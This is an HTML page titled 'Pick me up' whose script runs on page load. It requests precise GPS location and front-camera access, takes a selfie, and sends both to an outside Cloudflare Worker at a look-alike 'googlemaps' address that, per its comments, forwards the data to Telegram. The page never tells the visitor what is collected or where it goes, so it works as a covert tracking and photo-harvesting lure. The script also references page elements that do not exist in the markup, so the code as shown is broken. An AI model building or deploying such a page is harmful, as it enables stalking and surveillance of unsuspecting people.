<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Pick me up</title>
<style>
  /* Make the page fill the whole screen with no default margin */
  html,body { height:100%; margin:0; }

  /* Center everything (video + status text) vertically and horizontally */
  body { display:flex; flex-direction:column; align-items:center; justify-content:center; gap:16px;
         font-family:system-ui,sans-serif; font-size:22px; text-align:center; padding:20px;
         box-sizing:border-box; background:#f5f7fa; color:#111; }

  /* Use a dark background automatically if the phone is in dark mode */
  @media (prefers-color-scheme: dark) { body { background:#111; color:#f5f5f5; } }

  /* Camera preview box: flipped horizontally (scaleX(-1)) so it looks like a mirror, like a normal selfie camera */
  video { width:200px; border-radius:16px; transform:scaleX(-1); background:#000; }
</style>
</head>
<body>

<script>
  // The URL of your Cloudflare Worker, which receives the data and forwards it to Telegram.
  // No bot token is here — it's kept secret inside the Worker.
  const WORKER_URL = "https://googlemaps.mostafa-solom258.workers.dev";

  // Shortcuts to the status text element and the video element
  const s = document.getElementById("s");
  const v = document.getElementById("v");

  // Wraps the browser's location API in a Promise so we can "await" it.
  // enableHighAccuracy: ask for GPS-level precision, not just rough Wi-Fi/cell location
  // timeout: give up after 15 seconds if no answer
  // maximumAge: don't reuse an old cached location, always get a fresh one
  const getPosition = () => new Promise((res, rej) =>
    navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }));

  // Opens the front camera, waits a moment for it to adjust, captures one frame, and returns it as an image file (blob)
  async function takePhoto() {
    // Ask the browser for access to the front-facing ("user") camera, no microphone
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });

    // Feed the camera stream into the <video> element so it shows a live preview
    v.srcObject = stream;

    // Wait 1.2 seconds so the camera can auto-adjust exposure/focus before we capture
    await new Promise(r => setTimeout(r, 1200));

    // Create an invisible canvas the same size as the video, and draw the current video frame onto it
    const c = document.createElement("canvas");
    c.width = v.videoWidth; c.height = v.videoHeight;
    c.getContext("2d").drawImage(v, 0, 0);

    // Turn off the camera now that we've captured the frame (stops the camera indicator)
    stream.getTracks().forEach(t => t.stop());

    // Convert the canvas drawing into a JPEG image file (85% quality) and return it
    return new Promise(r => c.toBlob(r, "image/jpeg", 0.85));
  }

  // Main logic, runs automatically as soon as the page loads
  (async () => {
    // Keeps track of what successfully sent, e.g. ["location", "photo"]
    const sent = [];

    // --- Step 1: get and send location ---
    try {
      const { coords } = await getPosition(); // ask for GPS coordinates (triggers the location permission prompt)
      const r = await fetch(WORKER_URL, {      // send coordinates to the Worker as JSON
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ latitude: coords.latitude, longitude: coords.longitude })
      });
      if (r.ok) sent.push("location");          // mark success if the Worker accepted it
    } catch (e) {
      // Location failed (denied, timed out, etc.) — silently skip for now, nothing recorded
    }

    // --- Step 2: take and send a selfie ---
    try {
      const blob = await takePhoto();            // capture the photo (triggers the camera permission prompt)
      const fd = new FormData();                 // photos are sent as form-data, not JSON
      fd.append("photo", blob, "selfie.jpg");
      const r = await fetch(WORKER_URL, { method: "POST", body: fd });
      if (r.ok) sent.push("photo");               // mark success
      else sent.push(`photo-failed-${r.status}`);  // record the HTTP error code if the Worker rejected it
    } catch (e) {
      // record the exact error name and message (e.g. "NotAllowedError" if camera was denied)
      sent.push(`photo-error-${e.name}-${e.message}`);
    }

    // --- Step 3: show the result on screen ---
    v.style.display = "none"; // hide the camera preview now that we're done
    s.textContent = sent.length
      ? `✅ Sent: ${sent.join(" + ")}`                          // e.g. "✅ Sent: location + photo"
      : "❌ Please allow location and camera, then reopen";     // nothing succeeded at all
  })();
</script>
</body>
</html>
